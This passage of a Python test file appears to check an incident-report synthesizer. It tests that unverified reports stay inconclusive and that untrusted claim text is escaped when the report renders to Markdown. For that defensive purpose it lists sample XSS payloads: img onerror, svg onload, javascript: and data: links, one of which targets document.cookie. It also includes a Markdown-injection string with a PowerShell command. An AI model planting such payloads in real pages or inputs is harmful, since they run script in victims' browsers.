    assert bundle.executive_brief.incident_severity != IncidentSeverityTier.INFORMATIONAL


def test_sec_audit_002_detached_report_critical_looking_text():
    """Detached report with critical-looking claim text remains INCONCLUSIVE without verified telemetry."""
    inv_id = uuid.uuid4()
    dummy_ev = uuid.uuid4()
    claim = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text="Adversary exfiltrated 50GB of customer database records",
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[dummy_ev],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.99,
    )
    val_res = _make_sample_validation_result(
        inv_id,
        dummy_ev,
        "0" * 64,
        claims=[claim],
        hypotheses=[],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, context=None)
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INCONCLUSIVE
    assert bundle.executive_brief.incident_severity != IncidentSeverityTier.CRITICAL


def test_sec_audit_002_detached_report_explicit_truncation_disclosure():
    """T1-B/D7: a detached (unverified) report withholds client-supplied gap text and discloses why (D3 Amendment 1, Option A)."""
    inv_id = uuid.uuid4()
    val_res = _make_sample_validation_result(
        inv_id,
        uuid.uuid4(),
        "0" * 64,
        uncertainty_gaps=["CONTEXT_TRUNCATED: Historical log buffer dropped 50 events"],
    )
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, context=None)
    gaps = bundle.executive_brief.uncertainties_and_limitations
    assert bundle.executive_brief.incident_severity == IncidentSeverityTier.INCONCLUSIVE
    # The submitted (client-supplied) gap text is withheld on an unverified report ...
    assert not any("Historical log buffer dropped 50 events" in g for g in gaps)
    # ... and the report states why, and that telemetry is unavailable.
    assert any("REPORT_VERIFICATION_FAILED" in g for g in gaps)
    assert any("TELEMETRY_UNAVAILABLE" in g for g in gaps)


# ── SEC-AUDIT-004 REGRESSION TESTS: HARDENED UNTRUSTED MARKDOWN RENDERING ───

def test_sec_audit_004_html_and_script_injection_escaped():
    """Untrusted strings with <img onerror>, <svg onload>, <object>, and raw HTML are HTML-escaped."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)

    xss_payloads = [
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(document.domain)">',
        '<object data="javascript:alert(1)">',
        '<b>bold raw html</b>',
    ]
    claims = [
        FactualClaimItem(
            claim_id=uuid.uuid4(),
            claim_text=f"Observed injection attempt: {p}",
            category=ClaimCategory.OBSERVED_FACT,
            supporting_evidence_ids=[ev_uuid],
            references_exist=True,
            grounding_status=GroundingStatus.VALIDATED_REFERENCE,
            confidence=0.90,
        )
        for p in xss_payloads
    ]
    val_res = _make_sample_validation_result(inv_id, ev_uuid, ctx.reproducibility.context_sha256, claims=claims)
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)

    for md in (bundle.markdown_executive, bundle.markdown_technical, bundle.markdown_detection):
        assert '<img src="x"' not in md
        assert "&lt;img" in bundle.markdown_technical
        assert '<svg onload=' not in md
        assert "&lt;svg" in bundle.markdown_technical
        assert '<object data=' not in md
        assert "&lt;object" in bundle.markdown_technical
        assert '<b>bold raw html</b>' not in md
        assert "&lt;b&gt;" in bundle.markdown_technical


def test_sec_audit_004_unsafe_link_schemes_neutralized():
    """Markdown links using javascript: or data: schemes are neutralized to blocked anchors."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)

    malicious_links = (
        "Check this link: [Malicious](javascript:alert(document.cookie)) and "
        "[DataURI](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"
    )
    claim = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text=malicious_links,
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.90,
    )
    val_res = _make_sample_validation_result(inv_id, ev_uuid, ctx.reproducibility.context_sha256, claims=[claim])
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)

    for md in (bundle.markdown_executive, bundle.markdown_technical):
        assert "javascript:" not in md
        assert "data:text/html" not in md
        assert "[Malicious](#blocked-unsafe-link)" in md
        assert "[DataURI](#blocked-unsafe-link)" in md


def test_sec_audit_004_structural_headers_blockquotes_pipes_and_backticks():
    """Headers, blockquotes, table pipes, and multiline backticks are safely escaped."""
    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)

    structured_injection = (
        "# Injected H1\n"
        "> [!CAUTION] Injected Alert\n"
        "| column1 | column2 | column3 |\n"
        "Command executed: `powershell.exe -enc ``whoami`` `"
    )
    claim = FactualClaimItem(
        claim_id=uuid.uuid4(),
        claim_text=structured_injection,
        category=ClaimCategory.OBSERVED_FACT,
        supporting_evidence_ids=[ev_uuid],
        references_exist=True,
        grounding_status=GroundingStatus.VALIDATED_REFERENCE,
        confidence=0.90,
    )
    val_res = _make_sample_validation_result(inv_id, ev_uuid, ctx.reproducibility.context_sha256, claims=[claim])
    synthesizer = DeterministicReportSynthesizer()
    bundle = synthesizer.synthesize_bundle(val_res, ctx)

    md = bundle.markdown_technical
    # H1 must be escaped
    assert "\n# Injected H1" not in md
    assert r"\# Injected H1" in md
    # Blockquote must be escaped
    assert "\n> [!CAUTION] Injected Alert" not in md


def test_report_terminology_claims_validated_and_model_reported_confidence():
    """Phase 2.1: exported Markdown uses the approved labels and definitions; no legacy wording remains."""
    from app.schemas.report_terminology import (
        CLAIMS_VALIDATED_DEFINITION,
        MODEL_REPORTED_CONFIDENCE_DEFINITION,
    )

    inv_id = uuid.uuid4()
    ev_uuid = uuid.uuid4()
    ctx = _make_sample_context(inv_id, ev_uuid)
    val_res = _make_sample_validation_result(inv_id, ev_uuid, ctx.reproducibility.context_sha256)
    bundle = DeterministicReportSynthesizer().synthesize_bundle(val_res, ctx)
    md = bundle.markdown_technical

    assert "**Claims validated:**" in md
    assert "%" in md.split("**Claims validated:**")[1].splitlines()[0]
    assert CLAIMS_VALIDATED_DEFINITION in md
    assert MODEL_REPORTED_CONFIDENCE_DEFINITION in md
    assert "**Model-reported confidence:**" in md
    assert "Overall Grounding Score" not in md
    assert "**Confidence:**" not in md
    assert "does not establish that a cited source is truthful" in CLAIMS_VALIDATED_DEFINITION
    assert "not independently measured evidence strength" in MODEL_REPORTED_CONFIDENCE_DEFINITION
    # Machine-readable fields are unchanged.
    assert 0.0 <= bundle.provenance.overall_grounding_score <= 1.0
